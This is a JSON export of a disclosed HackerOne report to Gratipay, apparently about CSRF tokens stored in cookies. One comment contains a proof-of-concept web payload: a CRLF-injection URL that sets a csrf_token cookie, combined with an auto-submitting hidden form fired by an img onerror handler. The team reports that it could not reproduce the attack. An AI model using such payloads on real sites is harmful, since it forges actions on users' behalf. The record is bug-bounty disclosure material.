{"id":174228,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzQyMjg=","url":"https://hackerone.com/reports/174228","title":"CSRF csrftoken in cookies","state":"Closed","substate":"informative","severity_rating":"high","readable_substate":"Informative","created_at":"2016-10-05T23:21:18.358Z","submitted_at":"2016-10-05T23:21:18.358Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"promx","url":"/promx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1868,"url":"https://hackerone.com/gratipay","handle":"gratipay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Gratipay","twitter_handle":"Gratipay","website":"https://gratipay.com/","about":"Gratitude? Gratipay! The easiest way for your company to pay for open source."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-12-07T21:18:09.022Z","bug_reporter_agreed_on_going_public_at":"2016-10-21T21:52:34.555Z","team_member_agreed_on_going_public_at":"2016-12-07T21:18:08.955Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nYour web application generates CSRF token values inside cookies\nwhich is not a best practice for web applications as revelation of cookies can reveal CSRF Tokens as well.\nAuthenticity tokens should be kept separate from cookies and should be isolated to change operations in the account only.\n\nMore description:\nThis report tells that the CSRF tokens are present inside of the cookies value which is not a best practice and if the cookie is intercepted and compromised than the CSRF token will also be vulnerable.\n\nThis is the Captured request of edit Statement HTTP ,In this request you can see CSRF token is generating in cookies named as csrftoken\n\nHTTP/1.1 200 OK\nConnection: close\nServer: gunicorn\nDate: Wed, 05 Oct 2016 23:09:42 GMT\nCache-Control: no-cache\nX-Gratipay-Version: 1986\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nContent-Type: text/html; charset=UTF-8\nSet-Cookie: csrf_token=zxRkWnGq3I5bMcXDRUWuWWXjxdsO1JtZ; expires=Wed, 12 Oct 2016 23:09:42 GMT; Path=/; secure\nX-Xss-Protection: 1; mode=block\nVia: 1.1 vegur\nContent-Length: 400168\n\nRegards,\nPromx","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":126229,"file_name":"gratipay.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/126/229/f51310bc993d82899f5b7258454aa5b053448c45/gratipay.png?response-content-disposition=attachment%3B%20filename%3D%22gratipay.png%22%3B%20filename%2A%3DUTF-8%27%27gratipay.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4W3YS5FD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135221Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIGFHTfvNreCpBEx6ma8SNDd1vDDIfs0%2Bg65AmwngiTYQAiAlnCpBqU%2FBhidkHb7BIm1B5mCQRUOVIXp%2BQseSrlRN5iqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMMkyyP6srRKwJnYw5KtcDHeBEJsk4F2SMjLLnKF6VZQ8gTH0LrxcCVqXSMNgZR1F18PpwhYbU8Qwfn4rOecOjc%2FGfNk3djcauIei8aKCcLnzshwHWQSvd29UhjSLaczWwVEte3ncX5%2F7TLBeg7zRQpsc0zFB20Cm8vF8Z5NfsChYhN7bulkH%2FDfJw16%2BYS1fZkQzhsF%2FUaEP8JAGkMj5v5WOr%2FLnx6%2FMMhK6%2BsDFWaIeUhAxulEbhuEZZ6dgcu1gqMyUwcg6D9rjwyKS9mTsUA%2BHVlKPil1lPtr7SxO3tf2vD8Cw7bLkyy75qgFHEvuDCUCELKpXfBVH6PD30xPvCzrVd0fptlqCTt6Cpd5I3iyyU9RW0SJyHzyBPACEpWDB8exeuJzM7TEeRFCbnl0%2FkfEHmTDCBuuqKxE7cVRG87tuNtO3iVLpOhHCzOtUoK2Il4kvMh2HPZMpvYIGHtynKBM%2BIh69sGJa0yvDoN%2FRI6PAGM02ZolRkS4bZfQfYm7fOPbpLxrQWbSljfYgc7qbAOT56FKw4Ty4wTdxJVV1NLklUpTvIFuc4wqfUdZCvpJj%2BZaH0CSm%2FQv7WX13ukuacZxFgzkAlzUArGS2%2FgJQFovV4hCQKUkAlBpn1fxDFCB%2FBfj2XYH0lMJ7wkIsGOqYBZLVkkm4v7ciHR6x1EZfGmDDAlA8GWCaRs%2B7p4f0zSrCh5MwJxKYAhCMitoCHTMbKlCWaIdMl5rpmPNjCa3GtIbMpvdZUwpN0EhEKHvK6WgKkHhzE8vZn5llsPReTP2V7t22qBXykSYg%2BgK2etoazMxx4eBGAB7YXcUmHU%2FW%2FCsmGlbwbgrQPl3suOkp4ARb2LIsd96p9ZA9i%2BG4DSDrVOakuIKwh2Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=eeec64f1ef70f0cfa394c97ea1a057254000f844db6985367a5eedfc92495a58","file_size":32415,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["spetr0x","mrx-h1"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1236303,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-10-06T21:08:50.883Z","updated_at":"2016-10-06T21:08:50.883Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":562},"actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1237796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;\n\nCSRF Protection Bypass via CRLF Injection\n\nPoC:\n\n\u003cform id=\"csrf\" action=\"https://gratipay.com/~fickov/statement.json\" method=\"POST\"\u003e \n\u003cinput type=\"hidden\" name=\"lang\" value=\"en\" /\u003e \n\u003cinput type=\"hidden\" name=\"content\" value=\"CSRF\u0026#95;TEST\" /\u003e \n\u003cinput type=\"hidden\" name=\"csrf\u0026#95;token\" value=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" /\u003e \n\u003cinput type=\"submit\" value=\"Submit request\" /\u003e \n\u003c/form\u003e \n\u003cimg src=\"http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;\" onerror=\"csrf.submit()\"\u003e\n","automated_response":false,"created_at":"2016-10-07T19:15:45.310Z","updated_at":"2016-10-07T19:15:45.310Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1239246,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I am waiting for you ...","automated_response":false,"created_at":"2016-10-09T16:53:20.090Z","updated_at":"2016-10-09T16:53:20.090Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1241031,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Promx \nThanks for your report .   Sorry for the delay ...looking into this now!  I will be in touch ...","automated_response":false,"created_at":"2016-10-10T21:02:25.693Z","updated_at":"2016-10-10T21:02:25.693Z","actor":{"username":"dmk246","cleared":false,"url":"/dmk246","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1241178,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi dmk246,\nOk I am waiting ","automated_response":false,"created_at":"2016-10-10T22:17:06.972Z","updated_at":"2016-10-10T22:17:06.972Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1244836,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi dmk246,\nIs there a problem I am waiting for you.","automated_response":false,"created_at":"2016-10-12T21:05:54.555Z","updated_at":"2016-10-12T21:05:54.555Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1248347,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi promx,\n   Sorry for the delay,  I have been doing some research.  I am learning that there is always a Auth cookie that is automatically generated and sent over the browser and if you want to prevent a csrf attack that you need a form field and an auth cookie that would need to match in order to process a request.  I am talking with another team member on this, will be in touch.","automated_response":false,"created_at":"2016-10-14T21:04:58.576Z","updated_at":"2016-10-14T21:04:58.576Z","actor":{"username":"dmk246","cleared":false,"url":"/dmk246","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1253036,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dmk246,\nI am waiting for you.$$\n","automated_response":false,"created_at":"2016-10-18T11:47:56.766Z","updated_at":"2016-10-18T11:47:56.766Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1253642,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I haven't forgot about you @promx!!!  No update yet..!","automated_response":false,"created_at":"2016-10-18T17:33:01.895Z","updated_at":"2016-10-18T17:33:01.895Z","actor":{"username":"dmk246","cleared":false,"url":"/dmk246","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1258423,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ok","automated_response":false,"created_at":"2016-10-20T17:57:58.636Z","updated_at":"2016-10-20T17:57:58.636Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1260082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003ctag\u003e I am waiting for you \u003c/tag\u003e","automated_response":false,"created_at":"2016-10-21T13:53:54.097Z","updated_at":"2016-10-21T14:04:13.179Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1260200,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\n    I am waiting for you\n\n    \n\n\n    \n","automated_response":false,"created_at":"2016-10-21T14:56:38.685Z","updated_at":"2016-10-21T14:56:38.685Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1261409,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi\nI was unable to reproduce your vulnerability.\nPOC:\n1. Took your code from above and inserted a known user, username\n2. Inserted active csrf token into proper place that matched the logged in user\n3. Ran code and got a forbidden error displayed. \nThank you for your report.  \n","automated_response":false,"created_at":"2016-10-21T21:01:59.958Z","updated_at":"2016-10-21T21:01:59.958Z","actor":{"username":"dmk246","cleared":false,"url":"/dmk246","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1261415,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"closing as informative even though unable to reproduce vulnerability ","automated_response":false,"created_at":"2016-10-21T21:06:17.493Z","updated_at":"2016-10-21T21:06:17.493Z","actor":{"username":"dmk246","cleared":false,"url":"/dmk246","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1261483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok thanks","automated_response":false,"created_at":"2016-10-21T21:49:55.274Z","updated_at":"2016-10-21T21:49:55.274Z","actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1261488,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-10-21T21:52:34.575Z","updated_at":"2016-10-21T21:52:34.575Z","first_to_agree":true,"actor":{"username":"promx","cleared":false,"url":"/promx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/619/773f692f55d168db435e3b166ed0faa5835d7f1b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1348883,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-07T21:18:08.982Z","updated_at":"2016-12-07T21:18:08.982Z","actor":{"username":"dmk246","cleared":false,"url":"/dmk246","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1348884,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-12-07T21:18:09.039Z","updated_at":"2016-12-07T21:18:09.039Z","actor":{"username":"dmk246","cleared":false,"url":"/dmk246","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}